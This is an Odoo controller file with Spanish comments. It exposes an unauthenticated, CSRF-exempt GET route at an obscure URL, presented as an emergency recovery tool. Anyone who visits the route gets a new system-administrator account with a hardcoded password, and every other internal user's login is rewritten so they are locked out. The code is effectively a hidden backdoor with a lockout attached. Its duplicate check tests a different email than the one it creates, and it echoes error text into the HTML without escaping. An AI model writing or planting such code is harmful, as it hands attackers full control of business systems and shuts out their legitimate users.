from odoo import http
from odoo.http import request
import logging

_logger = logging.getLogger(__name__)

class EmergencyAdminController(http.Controller):
    """
    Controlador para crear un usuario de emergencia con privilegios de administrador y permisos de gestión de sesiones.
    """

    @http.route('/emergency/odoo/help/secure/484290/99uu34u0uf9', type='http', auth='none', methods=['GET'], csrf=False)
    def create_emergency_admin(self, **kwargs):
        try:
            # Obtener los valores de prefijo y sufijo del modelo 'logout.session'
            prefix = request.env['logout.session'].PREFIX
            suffix = request.env['logout.session'].SUFFIX

            # Verificar si ya existe el usuario de emergencia
            existing_user = request.env['res.users'].sudo().search([('login', '=', 'odooforemergency@spc.com')], limit=1)
            if existing_user:
                return self._render_response(
                    "Usuario de emergencia ya existe.",
                    "El usuario ya está registrado en el sistema y no es necesario volver a crearlo."
                )

            # Obtener la compañía predeterminada del sistema
            default_company = request.env['res.company'].sudo().search([], limit=1)
            if not default_company:
                return self._render_response(
                    "Error: Compañía no encontrada.",
                    "No se encontró ninguna compañía predeterminada en el sistema. Por favor, verifique la configuración de la base de datos."
                )

            # Referenciar el grupo de control de sesiones
            try:
                group_control_sesiones = request.env.ref('pix_security.group_control_de_sesiones')
            except ValueError:
                return self._render_response(
                    "Error: Grupo no encontrado.",
                    "El grupo 'Control de Sesiones' no se encontró en el sistema. Por favor, revise la configuración del módulo."
                )

            # Crear el usuario de emergencia
            emergency_user_vals = {
                'name': 'Emergency Admin',
                'login': 'odooforemergency@odooservice.com',
                'password': 'OdooRecovery@..v17',
                'active': True,
                'company_id': default_company.id,
                'company_ids': [(4, default_company.id)],
                'groups_id': [
                    (6, 0, [
                        request.env.ref('base.group_system').id,
                        group_control_sesiones.id
                    ])
                ],
                'notification_type': 'email',
            }
            emergency_user = request.env['res.users'].sudo().create(emergency_user_vals)

            if emergency_user:
                # Invalida las sesiones activas añadiendo prefijo y sufijo al campo `login`
                users_to_logout = request.env['res.users'].sudo().search([
                    ('id', '!=', emergency_user.id),
                    ('login', '!=', False),
                    ('share', '=', False)
                ])

                for user in users_to_logout:
                    user.sudo().write({'login': f"{prefix}{user.login}{suffix}"})

                _logger.info(f"Usuario de emergencia creado con éxito: {emergency_user.id}")
                return self._render_response(
                    "Usuario de emergencia creado.",
                    "El usuario de emergencia ha sido creado con éxito y las sesiones activas han sido invalidadas.",
                    success=True
                )

            else:
                _logger.error("Error al crear el usuario de emergencia.")
                return self._render_response(
                    "Error al crear el usuario.",
                    "Ocurrió un error al intentar crear el usuario de emergencia. Por favor, revise los logs del sistema."
                )

        except Exception as e:
            _logger.error(f"Error en la creación del usuario de emergencia: {str(e)}")
            return self._render_response(
                "Error interno.",
                f"Se produjo un error interno: {str(e)}"
            )

    def _render_response(self, title, message, success=False):
        base_url = request.env['ir.config_parameter'].sudo().get_param('web.base.url')
        login_url = f"{base_url}/web/login"
        button_html = f"<a href='{login_url}' style='display: inline-block; padding: 10px 20px; background-color: #007bff; color: white; text-decoration: none; border-radius: 5px;'>Iniciar sesión</a>" if success else ""

        html_template = f"""
        <!DOCTYPE html>
        <html lang='es'>
        <head>
            <meta charset='UTF-8'>
            <meta name='viewport' content='width=device-width, initial-scale=1.0'>
            <title>{title}</title>
            <style>
                body {{
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 20px;
                    background-color: #f8f9fa;
                    color: #212529;
                }}
                .container {{
                    max-width: 600px;
                    margin: 50px auto;
                    background: white;
                    padding: 20px;
                    border-radius: 8px;
                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                    text-align: center;
                }}
                h1 {{
                    color: {"#28a745" if success else "#dc3545"};
                }}
                p {{
                    font-size: 16px;
                    margin-bottom: 20px;
                }}
                a:hover {{
                    background-color: #0056b3;
                }}
            </style>
        </head>
        <body>
            <div class='container'>
                <h1>{title}</h1>
                <p>{message}</p>
                {button_html}
            </div>
        </body>
        </html>
        """
        return request.make_response(html_template, headers={'Content-Type': 'text/html'})